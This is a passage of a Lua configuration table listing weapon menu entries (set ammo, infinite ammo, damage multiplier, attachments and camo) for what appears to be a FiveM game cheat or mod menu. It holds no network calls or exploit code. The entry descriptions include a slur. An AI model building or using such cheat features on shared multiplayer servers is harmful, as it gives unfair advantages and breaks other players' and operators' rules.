            {text = 'Metal jacket rounds', dkey = 'weapon:assaultrifle_mk2_metaljacketrounds', desc = 'Enable the metal jacket rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ`},
            {text = 'Flashlight', dkey = 'weapon:assaultrifle_mk2_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Holographic sight', dkey = 'weapon:assaultrifle_mk2_holographicsight', desc = 'Enable the holographic sight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SIGHTS`},
            {text = 'Small scope', dkey = 'weapon:assaultrifle_mk2_smallscope', desc = 'Enable the small scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MACRO_MK2`},
            {text = 'Large scope', dkey = 'weapon:assaultrifle_mk2_largescope', desc = 'Enable the large scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MEDIUM_MK2`},
            {text = 'Suppressor', dkey = 'weapon:assaultrifle_mk2_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP_02`},
            {text = 'Grip', dkey = 'weapon:assaultrifle_mk2_grip', desc = 'Enable the grip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_AFGRIP_02`},
            {text = 'Flat muzzle break', dkey = 'weapon:assaultrifle_mk2_flatmuzzlebreak', desc = 'Enable the flat muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_01`},
            {text = 'Tactical muzzle break', dkey = 'weapon:assaultrifle_mk2_tacticalmuzzlebreak', desc = 'Enable the tactical muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_02`},
            {text = 'Fat-end muzzle break', dkey = 'weapon:assaultrifle_mk2_fat-endmuzzlebreak', desc = 'Enable the fat-end muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_03`},
            {text = 'Precision muzzle break', dkey = 'weapon:assaultrifle_mk2_precisionmuzzlebreak', desc = 'Enable the precision muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_04`},
            {text = 'Heavy duty muzzle break', dkey = 'weapon:assaultrifle_mk2_heavydutymuzzlebreak', desc = 'Enable the heavy duty muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_05`},
            {text = 'Slanted muzzle break', dkey = 'weapon:assaultrifle_mk2_slantedmuzzlebreak', desc = 'Enable the slanted muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_06`},
            {text = 'Split-end muzzle break', dkey = 'weapon:assaultrifle_mk2_split-endmuzzlebreak', desc = 'Enable the split-end muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_07`},
            {text = 'Default barrel', dkey = 'weapon:assaultrifle_mk2_defaultbarrel', desc = 'Enable the default barrel.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_BARREL_01`},
            {text = 'Heavy barrel', dkey = 'weapon:assaultrifle_mk2_heavytbarrel', desc = 'Enable the heavy barrel.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_BARREL_02`},
            {text = 'Digital camo', dkey = 'weapon:assaultrifle_mk2_digitalcamo', desc = 'Enable the digital camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTRIFLE_MK2_CAMO`},
            {text = 'Bruhstroke camo', dkey = 'weapon:assaultrifle_mk2_bruhstrokecamo', desc = 'Enable the bruhstroke camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTRIFLE_MK2_CAMO_02`},
            {text = 'Woodland camo', dkey = 'weapon:assaultrifle_mk2_woodlandcamo', desc = 'Enable the woodland camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTRIFLE_MK2_CAMO_03`},
            {text = 'Skull camo', dkey = 'weapon:assaultrifle_mk2_skullcamo', desc = 'Enable the skull camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTRIFLE_MK2_CAMO_04`},
            {text = 'Sessanta nove camo', dkey = 'weapon:assaultrifle_mk2_sessantanovecamo', desc = 'Enable the sessanta nove camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTRIFLE_MK2_CAMO_05`},
            {text = 'Perseus camo', dkey = 'weapon:assaultrifle_mk2_perseuscamo', desc = 'Enable the perseus camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTRIFLE_MK2_CAMO_06`},
            {text = 'Leopard camo', dkey = 'weapon:assaultrifle_mk2_leopardcamo', desc = 'Enable the leopard camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTRIFLE_MK2_CAMO_07`},
            {text = 'Zebra camo', dkey = 'weapon:assaultrifle_mk2_zebracamo', desc = 'Enable the zebra camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTRIFLE_MK2_CAMO_08`},
            {text = 'Geometric camo', dkey = 'weapon:assaultrifle_mk2_geometriccamo', desc = 'Enable the geometric camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTRIFLE_MK2_CAMO_09`},
            {text = 'Boom camo', dkey = 'weapon:assaultrifle_mk2_boomcamo', desc = 'Enable the boom camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTRIFLE_MK2_CAMO_10`},
            {text = 'Patriotic camo', dkey = 'weapon:assaultrifle_mk2_patrioticcamo', desc = 'Enable the patriotic camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTRIFLE_MK2_CAMO_IND_01`},
        },
        
        ['weapon:carbinerifle_mk2'] = {
            {text = 'Set ammo', dkey = 'weapon:carbinerifle_mk2_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:carbinerifle_mk2_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:carbinerifle_mk2_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:carbinerifle_mk2_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:carbinerifle_mk2_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:carbinerifle_mk2_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_MK2_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:carbinerifle_mk2_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_MK2_CLIP_02`},
            {text = 'Tracer rounds', dkey = 'weapon:carbinerifle_mk2_tracerrounds', desc = 'Enable the tracer rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER`},
            {text = 'Incendiary rounds', dkey = 'weapon:carbinerifle_mk2_incendiaryrounds', desc = 'Enable the incendiary rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY`},
            {text = 'Armor piercing rounds', dkey = 'weapon:carbinerifle_mk2_armorpiercingrounds', desc = 'Enable the armor piercing rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING`},
            {text = 'Metal jacket rounds', dkey = 'weapon:carbinerifle_mk2_metaljacketrounds', desc = 'Enable the metal jacket rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ`},
            {text = 'Flashlight', dkey = 'weapon:carbinerifle_mk2_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Holographic sight', dkey = 'weapon:carbinerifle_mk2_holographicsight', desc = 'Enable the holographic sight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SIGHTS`},
            {text = 'Small scope', dkey = 'weapon:carbinerifle_mk2_smallscope', desc = 'Enable the small scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MACRO_MK2`},
            {text = 'Large scope', dkey = 'weapon:carbinerifle_mk2_largescope', desc = 'Enable the large scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MEDIUM_MK2`},
            {text = 'Suppressor', dkey = 'weapon:carbinerifle_mk2_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP`},
            {text = 'Grip', dkey = 'weapon:carbinerifle_mk2_grip', desc = 'Enable the grip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_AFGRIP_02`},
            {text = 'Flat muzzle break', dkey = 'weapon:carbinerifle_mk2_flatmuzzlebreak', desc = 'Enable the flat muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_01`},
            {text = 'Tactical muzzle break', dkey = 'weapon:carbinerifle_mk2_tacticalmuzzlebreak', desc = 'Enable the tactical muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_02`},
            {text = 'Fat-end muzzle break', dkey = 'weapon:carbinerifle_mk2_fat-endmuzzlebreak', desc = 'Enable the fat-end muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_03`},
            {text = 'Precision muzzle break', dkey = 'weapon:carbinerifle_mk2_precisionmuzzlebreak', desc = 'Enable the precision muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_04`},
            {text = 'Heavy duty muzzle break', dkey = 'weapon:carbinerifle_mk2_heavydutymuzzlebreak', desc = 'Enable the heavy duty muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_05`},
            {text = 'Slanted muzzle break', dkey = 'weapon:carbinerifle_mk2_slantedmuzzlebreak', desc = 'Enable the slanted muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_06`},
            {text = 'Split-end muzzle break', dkey = 'weapon:carbinerifle_mk2_split-endmuzzlebreak', desc = 'Enable the split-end muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_07`},
            {text = 'Default barrel', dkey = 'weapon:carbinerifle_mk2_defaultbarrel', desc = 'Enable the default barrel.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_CR_BARREL_01`},
            {text = 'Heavy barrel', dkey = 'weapon:carbinerifle_mk2_heavytbarrel', desc = 'Enable the heavy barrel.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_CR_BARREL_02`},
            {text = 'Digital camo', dkey = 'weapon:carbinerifle_mk2_digitalcamo', desc = 'Enable the digital camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_MK2_CAMO`},
            {text = 'Bruhstroke camo', dkey = 'weapon:carbinerifle_mk2_bruhstrokecamo', desc = 'Enable the bruhstroke camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_MK2_CAMO_02`},
            {text = 'Woodland camo', dkey = 'weapon:carbinerifle_mk2_woodlandcamo', desc = 'Enable the woodland camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_MK2_CAMO_03`},
            {text = 'Skull camo', dkey = 'weapon:carbinerifle_mk2_skullcamo', desc = 'Enable the skull camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_MK2_CAMO_04`},
            {text = 'Sessanta nove camo', dkey = 'weapon:carbinerifle_mk2_sessantanovecamo', desc = 'Enable the sessanta nove camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_MK2_CAMO_05`},
            {text = 'Perseus camo', dkey = 'weapon:carbinerifle_mk2_perseuscamo', desc = 'Enable the perseus camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_MK2_CAMO_06`},
            {text = 'Leopard camo', dkey = 'weapon:carbinerifle_mk2_leopardcamo', desc = 'Enable the leopard camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_MK2_CAMO_07`},
            {text = 'Zebra camo', dkey = 'weapon:carbinerifle_mk2_zebracamo', desc = 'Enable the zebra camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_MK2_CAMO_08`},
            {text = 'Geometric camo', dkey = 'weapon:carbinerifle_mk2_geometriccamo', desc = 'Enable the geometric camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_MK2_CAMO_09`},
            {text = 'Boom camo', dkey = 'weapon:carbinerifle_mk2_boomcamo', desc = 'Enable the boom camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_MK2_CAMO_10`},
            {text = 'Patriotic camo', dkey = 'weapon:carbinerifle_mk2_patrioticcamo', desc = 'Enable the patriotic camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_CARBINERIFLE_MK2_CAMO_IND_01`},
        },
        
        ['weapon:compactrifle'] = {
            {text = 'Set ammo', dkey = 'weapon:compactrifle_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:compactrifle_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:compactrifle_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:compactrifle_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:compactrifle_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:compactrifle_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMPACTRIFLE_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:compactrifle_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMPACTRIFLE_CLIP_02`},
            {text = 'Drum clip', dkey = 'weapon:compactrifle_drumclip', desc = 'Enable the drum clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMPACTRIFLE_CLIP_03`},
        },
        
        ['weapon:mg'] = {
            {text = 'Set ammo', dkey = 'weapon:mg_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:mg_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:mg_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:mg_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:mg_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:mg_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MG_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:mg_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MG_CLIP_02`},
            {text = 'Scope', dkey = 'weapon:mg_scope', desc = 'Enable the scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_SMALL_02`},
            {text = 'Luxury variant', dkey = 'weapon:mg_luxuryvariant', desc = 'Enable the luxury variant.', afu = __REAPER1__.M.weapon.editor.luxuryvariant, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_MG_VARMOD_LOWRIDER`},
        },
        
        ['weapon:combatmg'] = {
            {text = 'Set ammo', dkey = 'weapon:combatmg_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:combatmg_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:combatmg_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:combatmg_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:combatmg_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:combatmg_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:combatmg_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_CLIP_02`},
            {text = 'Scope', dkey = 'weapon:combatmg_scope', desc = 'Enable the scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MEDIUM`},
            {text = 'Grip', dkey = 'weapon:combatmg_grip', desc = 'Enable the grip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_AFGRIP`},
            {text = 'Gun metal finish', dkey = 'weapon:combatmg_gunmetalfinish', desc = 'Enable the gun metal finish.', afu = __REAPER1__.M.weapon.editor.luxuryvariant, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_VARMOD_LOWRIDER`},
        },
        
        ['weapon:combatmg_mk2'] = {
            {text = 'Set ammo', dkey = 'weapon:combatmg_mk2_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:combatmg_mk2_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:combatmg_mk2_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:combatmg_mk2_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:combatmg_mk2_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:combatmg_mk2_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_MK2_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:combatmg_mk2_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_MK2_CLIP_02`},
            {text = 'Tracer rounds', dkey = 'weapon:combatmg_mk2_tracerrounds', desc = 'Enable the tracer rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_MK2_CLIP_TRACER`},
            {text = 'Incendiary rounds', dkey = 'weapon:combatmg_mk2_incendiaryrounds', desc = 'Enable the incendiary rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY`},
            {text = 'Armor piercing rounds', dkey = 'weapon:combatmg_mk2_armorpiercingrounds', desc = 'Enable the armor piercing rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING`},
            {text = 'Metal jacket rounds', dkey = 'weapon:combatmg_mk2_metaljacketrounds', desc = 'Enable the metal jacket rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_COMBATMG_MK2_CLIP_FMJ`},
            {text = 'Flashlight', dkey = 'weapon:combatmg_mk2_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Holographic sight', dkey = 'weapon:combatmg_mk2_holographicsight', desc = 'Enable the holographic sight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SIGHTS`},
            {text = 'Medium scope', dkey = 'weapon:combatmg_mk2_mediumscope', desc = 'Enable the medium scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_SMALL_MK2`},
            {text = 'Large scope', dkey = 'weapon:combatmg_mk2_largescope', desc = 'Enable the large scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MEDIUM_MK2`},
            {text = 'Suppressor', dkey = 'weapon:combatmg_mk2_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP`},
            {text = 'Grip', dkey = 'weapon:combatmg_mk2_grip', desc = 'Enable the grip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_AFGRIP_02	`},
